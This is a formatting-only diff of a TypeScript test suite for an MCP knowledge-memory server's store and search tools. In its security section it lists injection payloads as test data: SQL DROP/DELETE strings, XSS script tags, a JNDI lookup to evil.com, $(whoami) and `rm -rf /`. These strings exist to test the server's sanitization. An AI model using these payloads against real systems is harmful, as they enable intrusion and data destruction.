@@ -22,7 +22,7 @@ import {
   validateMemoryFindInput,
   ValidationError,
   MemoryStoreInputSchema,
-  MemoryFindInputSchema
+  MemoryFindInputSchema,
 } from '../../../src/schemas/mcp-inputs.js';
 import { memoryStore } from '../../../src/services/memory-store.js';
 import type {
@@ -30,7 +30,7 @@ import type {
   MemoryStoreResponse,
   MemoryFindResponse,
   ToolExecutionContext,
-  ToolResult
+  ToolResult,
 } from '../../../src/types/core-interfaces.js';
 
 // Mock dependencies
@@ -75,7 +75,7 @@ const mockSecurityService = {
   warmupCache: vi.fn(),
   invalidateCache: vi.fn(),
   startExecutionTimer: vi.fn(),
-  endExecutionTimer: vi.fn()
+  endExecutionTimer: vi.fn(),
 };
 
 // Mock performance monitoring functions
@@ -90,7 +90,7 @@ const mockPerformanceMonitor = {
   analyzeQueryComplexity: vi.fn(),
   routeQuery: vi.fn(),
   checkThresholds: vi.fn(),
-  getResourceMetrics: vi.fn()
+  getResourceMetrics: vi.fn(),
 };
 
 // Import mocked modules
@@ -105,24 +105,24 @@ const validMemoryStoreItem = {
   scope: {
     project: 'test-project',
     branch: 'main',
-    org: 'test-org'
+    org: 'test-org',
   },
   data: {
     title: 'Test Entity',
     description: 'Test entity description',
-    type: 'component'
-  }
+    type: 'component',
+  },
 };
 
 const validMemoryFindQuery = {
   query: 'test query',
   scope: {
     project: 'test-project',
-    branch: 'main'
+    branch: 'main',
   },
   types: ['entity', 'relation'],
   mode: 'auto' as const,
-  top_k: 10
+  top_k: 10,
 };
 
 const mockKnowledgeItems: KnowledgeItem[] = [
@@ -132,7 +132,7 @@ const mockKnowledgeItems: KnowledgeItem[] = [
     scope: { project: 'test', branch: 'main' },
     data: { title: 'Entity 1', type: 'component' },
     metadata: { created_at: '2024-01-01', confidence: 0.9 },
-    embeddings: [0.1, 0.2, 0.3]
+    embeddings: [0.1, 0.2, 0.3],
   },
   {
     id: 'relation-1',
@@ -140,8 +140,8 @@ const mockKnowledgeItems: KnowledgeItem[] = [
     scope: { project: 'test', branch: 'main' },
     data: { from: 'entity-1', to: 'entity-2', type: 'depends_on' },
     metadata: { created_at: '2024-01-02', confidence: 0.85 },
-    embeddings: [0.4, 0.5, 0.6]
-  }
+    embeddings: [0.4, 0.5, 0.6],
+  },
 ];
 
 // ============================================================================
@@ -154,7 +154,7 @@ const createMockExecutionContext = (): ToolExecutionContext => ({
   userId: 'test-user',
   sessionId: 'test-session',
   timestamp: new Date().toISOString(),
-  requestId: 'req-123'
+  requestId: 'req-123',
 });
 
 // ============================================================================
@@ -202,7 +202,7 @@ describe('MCP Tool Definition and Registration', () => {
     it('should reject invalid knowledge types', () => {
       const invalidItem = {
         ...validMemoryStoreItem,
-        kind: 'invalid_type' as any
+        kind: 'invalid_type' as any,
       };
 
       const result = MemoryStoreInputSchema.safeParse({ items: [invalidItem] });
@@ -216,7 +216,7 @@ describe('MCP Tool Definition and Registration', () => {
     it('should reject empty query strings', () => {
       const invalidQuery = {
         ...validMemoryFindQuery,
-        query: '' // Empty string
+        query: '', // Empty string
       };
 
       const result = MemoryFindInputSchema.safeParse(invalidQuery);
@@ -230,7 +230,7 @@ describe('MCP Tool Definition and Registration', () => {
     it('should auto-trim query whitespace', () => {
       const queryWithWhitespace = {
         ...validMemoryFindQuery,
-        query: '  test query with spaces  '
+        query: '  test query with spaces  ',
       };
 
       const result = MemoryFindInputSchema.parse(queryWithWhitespace);
@@ -246,7 +246,7 @@ describe('MCP Tool Definition and Registration', () => {
         scope: {
           project: 'complex-project',
           branch: 'feature/complex-feature',
-          org: 'complex-org'
+          org: 'complex-org',
         },
         data: {
           title: 'Complex Decision',
@@ -254,15 +254,15 @@ describe('MCP Tool Definition and Registration', () => {
           alternatives: ['Option A', 'Option B', 'Option C'],
           impacts: {
             technical: ['High complexity', 'Long development time'],
-            business: ['Increased cost', 'Delayed delivery']
+            business: ['Increased cost', 'Delayed delivery'],
           },
           stakeholders: ['Team A', 'Team B', 'Product Owner'],
           metadata: {
             priority: 'high',
             effort_estimate: '5 days',
-            risk_level: 'medium'
-          }
-        }
+            risk_level: 'medium',
+          },
+        },
       };
 
       const result = MemoryStoreInputSchema.safeParse({ items: [complexItem] });
@@ -277,7 +277,7 @@ describe('MCP Tool Definition and Registration', () => {
     it('should validate array parameters', () => {
       const queryWithArrayTypes = {
         ...validMemoryFindQuery,
-        types: ['entity', 'relation', 'observation', 'decision', 'issue']
+        types: ['entity', 'relation', 'observation', 'decision', 'issue'],
       };
 
       const result = MemoryFindInputSchema.safeParse(queryWithArrayTypes);
@@ -292,7 +292,7 @@ describe('MCP Tool Definition and Registration', () => {
 
     it('should handle optional parameters gracefully', () => {
       const minimalQuery = {
-        query: 'minimal test query'
+        query: 'minimal test query',
       };
 
       const result = MemoryFindInputSchema.safeParse(minimalQuery);
@@ -323,9 +323,9 @@ describe('MCP Tool Definition and Registration', () => {
         examples: [
           {
             description: 'Store a simple entity',
-            input: { items: [validMemoryStoreItem] }
-          }
-        ]
+            input: { items: [validMemoryStoreItem] },
+          },
+        ],
       };
 
       expect(toolMetadata.name).toBe('memory_store');
@@ -336,23 +336,23 @@ describe('MCP Tool Definition and Registration', () => {
 
     it('should handle tool versioning information', () => {
       const toolVersions = {
-        'memory_store': {
+        memory_store: {
           '1.0.0': {
             changes: ['Initial release', 'Basic storage functionality'],
             deprecated: false,
-            migrationRequired: false
+            migrationRequired: false,
           },
           '1.1.0': {
             changes: ['Added batch operations', 'Improved validation'],
             deprecated: false,
-            migrationRequired: false
+            migrationRequired: false,
           },
           '2.0.0': {
             changes: ['Breaking changes to schema', 'New scope handling'],
             deprecated: false,
-            migrationRequired: true
-          }
-        }
+            migrationRequired: true,
+          },
+        },
       };
 
       expect(toolVersions['memory_store']['2.0.0'].migrationRequired).toBe(true);
@@ -392,9 +392,9 @@ describe('Tool Execution Engine', () => {
           {
             kind: 'invalid_type',
             scope: {},
-            data: null
-          }
-        ]
+            data: null,
+          },
+        ],
       };
 
       expect(() => validateMemoryStoreInput(invalidParams)).toThrow(ValidationError);
@@ -419,7 +419,7 @@ describe('Tool Execution Engine', () => {
       const transformableQuery = {
         query: 'test query',
         top_k: '10', // String instead of number
-        mode: 'AUTO' // Uppercase instead of lowercase
+        mode: 'AUTO', // Uppercase instead of lowercase
       };
 
       const result = MemoryFindInputSchema.safeParse(transformableQuery);
@@ -438,7 +438,7 @@ describe('Tool Execution Engine', () => {
         success: true,
         stored: ['entity-1'],
         duplicates: [],
-        errors: []
+        errors: [],
       });
 
       // Execute lifecycle steps
@@ -492,9 +492,7 @@ describe('Tool Execution Engine', () => {
       try {
         await Promise.race([
           mockMemoryStore.store({ items: [validMemoryStoreItem] }),
-          new Promise((_, reject) =>
-            setTimeout(() => reject(new Error('Execution timeout')), 100)
-          )
+          new Promise((_, reject) => setTimeout(() => reject(new Error('Execution timeout')), 100)),
         ]);
       } catch (error) {
         const duration = Date.now() - startTime;
@@ -514,8 +512,8 @@ describe('Tool Execution Engine', () => {
         metadata: {
           executionTime: 150,
           itemsProcessed: 2,
-          knowledgeTypes: ['entity', 'relation']
-        }
+          knowledgeTypes: ['entity', 'relation'],
+        },
       };
 
       mockMemoryStore.store.mockResolvedValue(mockStoreResult);
@@ -536,9 +534,9 @@ describe('Tool Execution Engine', () => {
           {
             item: validMemoryStoreItem,
             error: 'Validation failed: Invalid scope',
-            code: 'VALIDATION_ERROR'
-          }
-        ]
+            code: 'VALIDATION_ERROR',
+          },
+        ],
       };
 
       mockMemoryStore.store.mockResolvedValue(mockErrorResult);
@@ -560,15 +558,15 @@ describe('Tool Execution Engine', () => {
           {
             item: { ...validMemoryStoreItem, kind: 'observation' as const },
             error: 'Missing required fields',
-            code: 'MISSING_FIELDS'
-          }
-        ]
+            code: 'MISSING_FIELDS',
+          },
+        ],
       };
 
       mockMemoryStore.store.mockResolvedValue(mockPartialResult);
 
       const result = await mockMemoryStore.store({
-        items: [validMemoryStoreItem, { ...validMemoryStoreItem, kind: 'observation' as const }]
+        items: [validMemoryStoreItem, { ...validMemoryStoreItem, kind: 'observation' as const }],
       });
 
       expect(result.success).toBe(true);
@@ -602,15 +600,15 @@ describe('Knowledge Type Tools', () => {
           type: 'microservice',
           description: 'Handles user authentication and profile management',
           tags: ['auth', 'user-management', 'microservice'],
-          relationships: ['depends_on:database', 'connects_to:notification-service']
-        }
+          relationships: ['depends_on:database', 'connects_to:notification-service'],
+        },
       };
 
       mockMemoryStore.store.mockResolvedValue({
         success: true,
         stored: ['entity-123'],
         duplicates: [],
-        errors: []
+        errors: [],
       });
 
       const result = await mockMemoryStore.store({ items: [entityItem] });
@@ -624,7 +622,7 @@ describe('Knowledge Type Tools', () => {
       const findParams = {
         query: 'User Service microservice',
         scope: { project: 'test-project' },
-        types: ['entity']
+        types: ['entity'],
       };
 
       const mockFindResult: MemoryFindResponse = {
@@ -634,17 +632,17 @@ describe('Knowledge Type Tools', () => {
             data: {
               ...mockKnowledgeItems[0].data,
               title: 'User Service',
-              type: 'microservice'
-            }
-          }
+              type: 'microservice',
+            },
+          },
         ],
         total: 1,
         searchTime: 45,
         metadata: {
           searchMode: 'semantic',
           confidenceThreshold: 0.7,
-          queryExpansion: true
-        }
+          queryExpansion: true,
+        },
       };
 
       mockMemoryStore.find.mockResolvedValue(mockFindResult);
@@ -664,26 +662,27 @@ describe('Knowledge Type Tools', () => {
         scope: { project: 'test-project', branch: 'main' },
         data: {
           title: 'Use PostgreSQL for primary database',
-          rationale: 'PostgreSQL offers advanced features like JSON support, transactions, and better performance for complex queries',
+          rationale:
+            'PostgreSQL offers advanced features like JSON support, transactions, and better performance for complex queries',
           alternatives: [
             'MongoDB - NoSQL approach, flexible schema',
-            'MySQL - Traditional RDBMS, limited JSON support'
+            'MySQL - Traditional RDBMS, limited JSON support',
           ],
           consequences: {
             positive: ['ACID compliance', 'Complex query support', 'JSON column support'],
-            negative: ['Learning curve for team', 'Migration complexity']
+            negative: ['Learning curve for team', 'Migration complexity'],
           },
           status: 'accepted',
           decisionMaker: 'Architecture Team',
-          date: '2024-01-15'
-        }
+          date: '2024-01-15',
+        },
       };
 
       mockMemoryStore.store.mockResolvedValue({
         success: true,
         stored: ['decision-456'],
         duplicates: [],
-        errors: []
+        errors: [],
       });
 
       const result = await mockMemoryStore.store({ items: [decisionItem] });
@@ -696,7 +695,7 @@ describe('Knowledge Type Tools', () => {
       const findParams = {
         query: 'database architecture decision PostgreSQL',
         types: ['decision'],
-        scope: { project: 'test-project' }
+        scope: { project: 'test-project' },
       };
 
       const mockDecisions: MemoryFindResponse = {
@@ -708,13 +707,13 @@ describe('Knowledge Type Tools', () => {
             data: {
               title: 'Use PostgreSQL for primary database',
               rationale: 'Technical considerations for database selection',
-              status: 'accepted'
+              status: 'accepted',
             },
-            metadata: { created_at: '2024-01-15', confidence: 0.95 }
-          }
+            metadata: { created_at: '2024-01-15', confidence: 0.95 },
+          },
         ],
         total: 1,
-        searchTime: 32
+        searchTime: 32,
       };
 
       mockMemoryStore.find.mockResolvedValue(mockDecisions);
@@ -741,16 +740,16 @@ describe('Knowledge Type Tools', () => {
           metadata: {
             dependency_type: 'runtime',
             criticality: 'high',
-            impact_score: 0.9
-          }
-        }
+            impact_score: 0.9,
+          },
+        },
       };
 
       mockMemoryStore.store.mockResolvedValue({
         success: true,
         stored: ['relation-789'],
         duplicates: [],
-        errors: []
+        errors: [],
       });
 
       const result = await mockMemoryStore.store({ items: [relationItem] });
@@ -763,7 +762,7 @@ describe('Knowledge Type Tools', () => {
       const findParams = {
         query: 'service dependencies architecture',
         types: ['relation'],
-        scope: { project: 'test-project' }
+        scope: { project: 'test-project' },
       };
 
       const mockRelations: MemoryFindResponse = {
@@ -775,9 +774,9 @@ describe('Knowledge Type Tools', () => {
             data: {
               from: 'user-service',
               to: 'auth-service',
-              type: 'connects_to'
+              type: 'connects_to',
             },
-            metadata: { created_at: '2024-01-01', confidence: 0.8 }
+            metadata: { created_at: '2024-01-01', confidence: 0.8 },
           },
           {
             id: 'relation-2',
@@ -786,10 +785,10 @@ describe('Knowledge Type Tools', () => {
             data: {
               from: 'user-service',
               to: 'notification-service',
-              type: 'publishes_to'
+              type: 'publishes_to',
             },
-            metadata: { created_at: '2024-01-02', confidence: 0.85 }
-          }
+            metadata: { created_at: '2024-01-02', confidence: 0.85 },
+          },
         ],
         total: 2,
         searchTime: 67,
@@ -797,9 +796,9 @@ describe('Knowledge Type Tools', () => {
           networkAnalysis: {
             nodes: 3,
             edges: 2,
-            centralityScore: 0.7
-          }
-        }
+            centralityScore: 0.7,
+          },
+        },
       };
 
       mockMemoryStore.find.mockResolvedValue(mockRelations);
@@ -823,18 +822,18 @@ describe('Knowledge Type Tools', () => {
           metrics: {
             avg_response_time: '2500ms',
             baseline_response_time: '600ms',
-            impact_severity: 'high'
+            impact_severity: 'high',
           },
           evidence: ['Grafana dashboard screenshots', 'Log samples'],
-          recommendations: ['Implement caching', 'Database query optimization']
-        }
+          recommendations: ['Implement caching', 'Database query optimization'],
+        },
       };
 
       mockMemoryStore.store.mockResolvedValue({
         success: true,
         stored: ['observation-101'],
         duplicates: [],
-        errors: []
+        errors: [],
       });
 
       const result = await mockMemoryStore.store({ items: [observationItem] });
@@ -865,7 +864,7 @@ describe('Search and Discovery Tools', () => {
         types: ['entity', 'decision', 'observation'],
         scope: { project: 'test-project' },
         mode: 'deep' as const,
-        top_k: 15
+        top_k: 15,
       };
 
       const mockSearchResults: MemoryFindResponse = {
@@ -876,13 +875,13 @@ describe('Search and Discovery Tools', () => {
               ...mockKnowledgeItems[0].data,
               title: 'Authentication Service',
               type: 'component',
-              tags: ['security', 'auth', 'login']
+              tags: ['security', 'auth', 'login'],
             },
             metadata: {
               ...mockKnowledgeItems[0].metadata,
               relevanceScore: 0.94,
-              matchHighlights: ['authentication', 'security', 'user']
-            }
+              matchHighlights: ['authentication', 'security', 'user'],
+            },
           },
           {
             id: 'decision-1',
@@ -891,15 +890,15 @@ describe('Search and Discovery Tools', () => {
             data: {
               title: 'Implement OAuth 2.0 for authentication',
               rationale: 'OAuth 2.0 provides industry-standard security',
-              status: 'implemented'
+              status: 'implemented',
             },
             metadata: {
               created_at: '2024-01-10',
               confidence: 0.89,
               relevanceScore: 0.87,
-              matchHighlights: ['OAuth', 'authentication', 'security']
-            }
-          }
+              matchHighlights: ['OAuth', 'authentication', 'security'],
+            },
+          },
         ],
         total: 2,
         searchTime: 156,
@@ -909,9 +908,9 @@ describe('Search and Discovery Tools', () => {
           synonyms: ['auth', 'login', 'security'],
           filters: {
             knowledgeTypes: ['entity', 'decision'],
-            dateRange: { start: '2024-01-01', end: '2024-01-31' }
-          }
-        }
+            dateRange: { start: '2024-01-01', end: '2024-01-31' },
+          },
+        },
       };
 
       mockMemoryStore.find.mockResolvedValue(mockSearchResults);
@@ -928,13 +927,13 @@ describe('Search and Discovery Tools', () => {
       const fastSearchParams = {
         query: 'user service',
         mode: 'fast' as const,
-        top_k: 5
+        top_k: 5,
       };
 
       const deepSearchParams = {
         query: 'user service',
         mode: 'deep' as const,
-        top_k: 20
+        top_k: 20,
       };
 
       // Mock fast search - quick, limited results
@@ -942,22 +941,22 @@ describe('Search and Discovery Tools', () => {
         results: [mockKnowledgeItems[0]],
         total: 1,
         searchTime: 23,
-        metadata: { searchMode: 'keyword' }
+        metadata: { searchMode: 'keyword' },
       });
 
       // Mock deep search - comprehensive, detailed results
       mockMemoryStore.find.mockResolvedValueOnce({
         results: [
           mockKnowledgeItems[0],
-          { ...mockKnowledgeItems[1], kind: 'observation' as const }
+          { ...mockKnowledgeItems[1], kind: 'observation' as const },
         ],
         total: 2,
         searchTime: 234,
         metadata: {
           searchMode: 'semantic',
           queryExpansion: true,
-          relatedConcepts: ['microservice', 'user-management']
-        }
+          relatedConcepts: ['microservice', 'user-management'],
+        },
       });
 
       const fastResult = await mockMemoryStore.find(fastSearchParams);
@@ -977,7 +976,7 @@ describe('Search and Discovery Tools', () => {
       const conceptualQuery = {
         query: 'problems with user login functionality',
         types: ['issue', 'observation'],
-        scope: { project: 'test-project' }
+        scope: { project: 'test-project' },
       };
 
       const mockConceptualResults: MemoryFindResponse = {
@@ -990,15 +989,15 @@ describe('Search and Discovery Tools', () => {
               title: 'Users cannot authenticate with correct credentials',
               description: 'Login endpoint returning 401 even with valid passwords',
               severity: 'high',
-              status: 'investigating'
+              status: 'investigating',
             },
             metadata: {
               created_at: '2024-01-20',
               confidence: 0.91,
               semanticDistance: 0.23,
-              conceptMatches: ['authentication', 'login', 'credentials']
-            }
-          }
+              conceptMatches: ['authentication', 'login', 'credentials'],
+            },
+          },
         ],
         total: 1,
         searchTime: 89,
@@ -1007,9 +1006,9 @@ describe('Search and Discovery Tools', () => {
             concepts: ['authentication', 'login', 'security', 'credentials'],
             entities: ['login endpoint', 'users'],
             intent: 'troubleshooting',
-            confidence: 0.91
-          }
-        }
+            confidence: 0.91,
+          },
+        },
       };
 
       mockMemoryStore.find.mockResolvedValue(mockConceptualResults);
@@ -1031,8 +1030,8 @@ describe('Search and Discovery Tools', () => {
         filters: {
           dateRange: { start: '2024-01-01', end: '2024-01-31' },
           confidence: { min: 0.8 },
-          tags: ['microservice', 'api']
-        }
+          tags: ['microservice', 'api'],
+        },
       };
 
       const mockFilteredResults: MemoryFindResponse = {
@@ -1042,9 +1041,9 @@ describe('Search and Discovery Tools', () => {
             metadata: {
               ...mockKnowledgeItems[0].metadata,
               created_at: '2024-01-15',
-              confidence: 0.92
-            }
-          }
+              confidence: 0.92,
+            },
+          },
         ],
         total: 1,
         searchTime: 45,
@@ -1052,14 +1051,14 @@ describe('Search and Discovery Tools', () => {
           appliedFilters: {
             dateRange: { applied: true, filtered: 5 },
             confidence: { applied: true, filtered: 2 },
-            tags: { applied: true, matched: ['microservice'] }
+            tags: { applied: true, matched: ['microservice'] },
           },
           facets: {
             types: { entity: 1, relation: 0 },
             confidence: { '0.8-0.9': 0, '0.9-1.0': 1 },
-            tags: { microservice: 1, api: 1 }
-          }
-        }
+            tags: { microservice: 1, api: 1 },
+          },
+        },
       };
 
       mockMemoryStore.find.mockResolvedValue(mockFilteredResults);
@@ -1080,7 +1079,7 @@ describe('Search and Discovery Tools', () => {
         scope: { project: 'test-project' },
         format: 'detailed_report' as const,
         includeMetrics: true,
-        includeTimeline: true
+        includeTimeline: true,
       };
 
       const mockReportResults: MemoryFindResponse = {
@@ -1093,10 +1092,10 @@ describe('Search and Discovery Tools', () => {
               title: 'Microservices Architecture Decision',
               rationale: 'Scalability and team autonomy requirements',
               status: 'implemented',
-              date: '2024-01-10'
+              date: '2024-01-10',
             },
-            metadata: { created_at: '2024-01-10', confidence: 0.95 }
-          }
+            metadata: { created_at: '2024-01-10', confidence: 0.95 },
+          },
         ],
         total: 1,
         searchTime: 67,
@@ -1108,23 +1107,23 @@ describe('Search and Discovery Tools', () => {
               totalDecisions: 1,
               implementedDecisions: 1,
               averageConfidence: 0.95,
-              dateRange: { start: '2024-01-10', end: '2024-01-10' }
+              dateRange: { start: '2024-01-10', end: '2024-01-10' },
             },
             metrics: {
               knowledgeGrowth: { entities: 15, relations: 23, decisions: 8 },
               searchPerformance: { avgTime: 67, successRate: 0.98 },
-              engagement: { queries: 156, uniqueUsers: 12 }
+              engagement: { queries: 156, uniqueUsers: 12 },
             },
             timeline: [
               {
                 date: '2024-01-10',
                 event: 'Architecture decision made',
                 items: ['decision-1'],
-                impact: 'high'
-              }
-            ]
-          }
-        }
+                impact: 'high',
+              },
+            ],
+          },
+        },
       };
 
       mockMemoryStore.find.mockResolvedValue(mockReportResults);
@@ -1158,7 +1157,7 @@ describe('Security and Authorization', () => {
   describe('Tool-level Access Control', () => {
     it('should validate user access to specific tools', async () => {
       mockSecurityService.validateToolAccess
-        .mockResolvedValueOnce(true)  // Admin user
+        .mockResolvedValueOnce(true) // Admin user
         .mockResolvedValueOnce(false); // Regular user
 
       const adminAccess = await mockSecurityService.validateToolAccess(
@@ -1177,23 +1176,35 @@ describe('Security and Authorization', () => {
 
     it('should enforce role-based permissions', async () => {
       const rolePermissions = {
-        'admin': ['memory_store', 'memory_find', 'memory_delete', 'system_admin'],
-        'developer': ['memory_store', 'memory_find'],
-        'viewer': ['memory_find']
+        admin: ['memory_store', 'memory_find', 'memory_delete', 'system_admin'],
+        developer: ['memory_store', 'memory_find'],
+        viewer: ['memory_find'],
       };
 
       mockSecurityService.validateToolAccess.mockImplementation(
         async (userId: string, toolName: string) => {
-          const userRole = userId.includes('admin') ? 'admin' :
-                          userId.includes('dev') ? 'developer' : 'viewer';
+          const userRole = userId.includes('admin')
+            ? 'admin'
+            : userId.includes('dev')
+              ? 'developer'
+              : 'viewer';
           return rolePermissions[userRole as keyof typeof rolePermissions].includes(toolName);
         }
       );
 
-      const adminCanStore = await mockSecurityService.validateToolAccess('admin-123', 'memory_store');
+      const adminCanStore = await mockSecurityService.validateToolAccess(
+        'admin-123',
+        'memory_store'
+      );
       const devCanStore = await mockSecurityService.validateToolAccess('dev-123', 'memory_store');
-      const viewerCanStore = await mockSecurityService.validateToolAccess('viewer-123', 'memory_store');
-      const viewerCanFind = await mockSecurityService.validateToolAccess('viewer-123', 'memory_find');
+      const viewerCanStore = await mockSecurityService.validateToolAccess(
+        'viewer-123',
+        'memory_store'
+      );
+      const viewerCanFind = await mockSecurityService.validateToolAccess(
+        'viewer-123',
+        'memory_find'
+      );
 
       expect(adminCanStore).toBe(true);
       expect(devCanStore).toBe(true);
@@ -1216,7 +1227,7 @@ describe('Security and Authorization', () => {
         userId: 'malicious-user',
         tool: 'system_admin',
         reason: 'insufficient_permissions',
-        timestamp: expect.any(String)
+        timestamp: expect.any(String),
       });
     });
   });
@@ -1226,21 +1237,18 @@ describe('Security and Authorization', () => {
       const maliciousParams = {
         query: "test'; DROP TABLE entities; --",
         scope: { project: '<script>alert("xss")</script>' },
-        types: ['entity', "'; DELETE FROM relations; --"]
+        types: ['entity', "'; DELETE FROM relations; --"],
       };
 
       const sanitizedParams = {
         query: 'test DROP TABLE entities',
         scope: { project: 'alert(xss)' },
-        types: ['entity', 'DELETE FROM relations']
+        types: ['entity', 'DELETE FROM relations'],
       };
 
       mockSecurityService.sanitizeParameters.mockResolvedValue(sanitizedParams);
 
-      const result = await mockSecurityService.sanitizeParameters(
-        'memory_find',
-        maliciousParams
-      );
+      const result = await mockSecurityService.sanitizeParameters('memory_find', maliciousParams);
 
       expect(result.query).not.toContain("';");
       expect(result.query).not.toContain('--');
@@ -1255,16 +1263,16 @@ describe('Security and Authorization', () => {
       const injectionAttempts = [
         "'; SELECT * FROM users; --",
         "<script>fetch('/api/steal-data')</script>",
-        "${jndi:ldap://evil.com/a}",
-        "{{7*7}}",
-        "$(whoami)",
-        "`rm -rf /`"
+        '${jndi:ldap://evil.com/a}',
+        '{{7*7}}',
+        '$(whoami)',
+        '`rm -rf /`',
       ];
 
       mockSecurityService.sanitizeParameters.mockImplementation(
         async (toolName: string, params: any) => {
           const paramString = JSON.stringify(params);
-          const hasInjection = injectionAttempts.some(attempt =>
+          const hasInjection = injectionAttempts.some((attempt) =>
             paramString.toLowerCase().includes(attempt.toLowerCase())
           );
 
@@ -1278,7 +1286,7 @@ describe('Security and Authorization', () => {
 
       await expect(
         mockSecurityService.sanitizeParameters('memory_find', {
-          query: injectionAttempts[0]
+          query: injectionAttempts[0],
         })
       ).rejects.toThrow('Potential injection detected');
     });
@@ -1292,14 +1300,14 @@ describe('Security and Authorization', () => {
         userId: 'authorized-user',
         sessionId: 'secure-session',
         timestamp: new Date().toISOString(),
-        requestId: 'req-456'
+        requestId: 'req-456',
       };
 
       mockSecurityService.validateExecutionContext.mockResolvedValue({
         valid: true,
         permissions: ['read', 'write'],
         restrictions: [],
-        expiry: new Date(Date.now() + 3600000).toISOString()
+        expiry: new Date(Date.now() + 3600000).toISOString(),
       });
 
       const validation = await mockSecurityService.validateExecutionContext(secureContext);
@@ -1314,24 +1322,26 @@ describe('Security and Authorization', () => {
         async (userId: string, operation: string) => {
           const userLimits = {
             'user-1': { storage: 1000000, queries: 1000, batchSize: 100 },
-            'user-2': { storage: 100000, queries: 100, batchSize: 10 }
+            'user-2': { storage: 100000, queries: 100, batchSize: 10 },
           };
 
-          const limits = userLimits[userId as keyof typeof userLimits] ||
-                        { storage: 10000, queries: 50, batchSize: 5 };
+          const limits = userLimits[userId as keyof typeof userLimits] || {
+            storage: 10000,
+            queries: 50,
+            batchSize: 5,
+          };
 
           // Simulate usage check
           const currentUsage = {
             storage: operation === 'store' ? 500000 : 0,
-            queries: operation === 'find' ? 150 : 0
+            queries: operation === 'find' ? 150 : 0,
           };
 
           return {
-            allowed: currentUsage.storage < limits.storage &&
-                     currentUsage.queries < limits.queries,
+            allowed: currentUsage.storage < limits.storage && currentUsage.queries < limits.queries,
             limits,
             currentUsage,
-            reason: currentUsage.storage >= limits.storage ? 'storage_exceeded' : null
+            reason: currentUsage.storage >= limits.storage ? 'storage_exceeded' : null,
           };
         }
       );
@@ -1357,14 +1367,14 @@ describe('Security and Authorization', () => {
         executionTime: 145,
         timestamp: new Date().toISOString(),
         ipAddress: '192.168.1.100',
-        userAgent: 'MCP-Client/1.0'
+        userAgent: 'MCP-Client/1.0',
       };
 
       mockSecurityService.logSecurityEvent.mockResolvedValue(undefined);
 
       await mockSecurityService.logSecurityEvent({
         type: 'TOOL_EXECUTION',
-        ...auditEvent
+        ...auditEvent,
       });
 
       expect(mockSecurityService.logSecurityEvent).toHaveBeenCalledWith(
@@ -1372,7 +1382,7 @@ describe('Security and Authorization', () => {
           type: 'TOOL_EXECUTION',
           toolName: 'memory_store',
           userId: executionContext.userId,
-          timestamp: expect.any(String)
+          timestamp: expect.any(String),
         })
       );
     });
@@ -1389,8 +1399,8 @@ describe('Security and Authorization', () => {
           context: {
             ipAddress: '10.0.0.50',
             attempts: 5,
-            userAgent: 'Unknown-Client/0.1'
-          }
+            userAgent: 'Unknown-Client/0.1',
+          },
         },
         {
           type: 'PARAMETER_INJECTION',
@@ -1401,9 +1411,9 @@ describe('Security and Authorization', () => {
           timestamp: new Date().toISOString(),
           context: {
             maliciousParams: { query: "'; DROP TABLE entities; --" },
-            blocked: true
-          }
-        }
+            blocked: true,
+          },
+        },
       ];
 
       for (const violation of securityViolations) {
@@ -1414,13 +1424,13 @@ describe('Security and Authorization', () => {
       expect(mockSecurityService.logSecurityEvent).toHaveBeenCalledWith(
         expect.objectContaining({
           type: 'UNAUTHORIZED_ACCESS',
-          severity: 'high'
+          severity: 'high',
         })
       );
       expect(mockSecurityService.logSecurityEvent).toHaveBeenCalledWith(
         expect.objectContaining({
           type: 'PARAMETER_INJECTION',
-          severity: 'critical'
+          severity: 'critical',
         })
       );
     });
@@ -1445,7 +1455,7 @@ describe('Performance and Optimization', () => {
       const simpleQuery = {
         query: 'user service',
         mode: 'fast' as const,
-        top_k: 5
+        top_k: 5,
       };
 
       const complexQuery = {
@@ -1454,20 +1464,24 @@ describe('Performance and Optimization', () => {
         top_k: 50,
         filters: {
           dateRange: { start: '2024-01-01', end: '2024-12-31' },
-          confidence: { min: 0.8 }
-        }
+          confidence: { min: 0.8 },
+        },
       };
 
       mockPerformanceMonitor.analyzeQueryComplexity
         .mockResolvedValueOnce({ complexity: 'low', estimatedTime: 50, strategy: 'keyword' })
-        .mockResolvedValueOnce({ complexity: 'high', estimatedTime: 500, strategy: 'semantic_parallel' });
+        .mockResolvedValueOnce({
+          complexity: 'high',
+          estimatedTime: 500,
+          strategy: 'semantic_parallel',
+        });
 
       mockMemoryStore.find
         .mockResolvedValueOnce({
           results: [mockKnowledgeItems[0]],
           total: 1,
           searchTime: 45,
-          metadata: { optimization: 'keyword_index' }
+          metadata: { optimization: 'keyword_index' },
         })
         .mockResolvedValueOnce({
           results: mockKnowledgeItems,
@@ -1476,8 +1490,8 @@ describe('Performance and Optimization', () => {
           metadata: {
             optimization: 'vector_search_with_filters',
             parallelExecution: true,
-            cacheHit: false
-          }
+            cacheHit: false,
+          },
         });
 
       const simpleAnalysis = await mockPerformanceMonitor.analyzeQueryComplexity(simpleQuery);
@@ -1495,18 +1509,18 @@ describe('Performance and Optimization', () => {
         { query: 'specific entity name', expectedRoute: 'exact_match' },
         { query: 'user authentication flow', expectedRoute: 'semantic_search' },
         { query: 'tag:security type:decision', expectedRoute: 'filtered_search' },
-        { query: 'recent issues high priority', expectedRoute: 'temporal_search' }
+        { query: 'recent issues high priority', expectedRoute: 'temporal_search' },
       ];
 
-      mockPerformanceMonitor.routeQuery.mockImplementation(
-        async (query: any) => {
-          if (query.query.includes('specific entity')) return { route: 'exact_match', confidence: 0.95 };
-          if (query.query.includes('authentication')) return { route: 'semantic_search', confidence: 0.87 };
-          if (query.query.includes('tag:')) return { route: 'filtered_search', confidence: 0.92 };
-          if (query.query.includes('recent')) return { route: 'temporal_search', confidence: 0.78 };
-          return { route: 'default', confidence: 0.5 };
-        }
-      );
+      mockPerformanceMonitor.routeQuery.mockImplementation(async (query: any) => {
+        if (query.query.includes('specific entity'))
+          return { route: 'exact_match', confidence: 0.95 };
+        if (query.query.includes('authentication'))
+          return { route: 'semantic_search', confidence: 0.87 };
+        if (query.query.includes('tag:')) return { route: 'filtered_search', confidence: 0.92 };
+        if (query.query.includes('recent')) return { route: 'temporal_search', confidence: 0.78 };
+        return { route: 'default', confidence: 0.5 };
+      });
 
       for (const { query, expectedRoute } of queries) {
         const routing = await mockPerformanceMonitor.routeQuery({ query });
@@ -1523,7 +1537,7 @@ describe('Performance and Optimization', () => {
         results: [mockKnowledgeItems[0]],
         total: 1,
         searchTime: 5,
-        metadata: { cache: 'L1_hit', age: 30 }
+        metadata: { cache: 'L1_hit', age: 30 },
       };
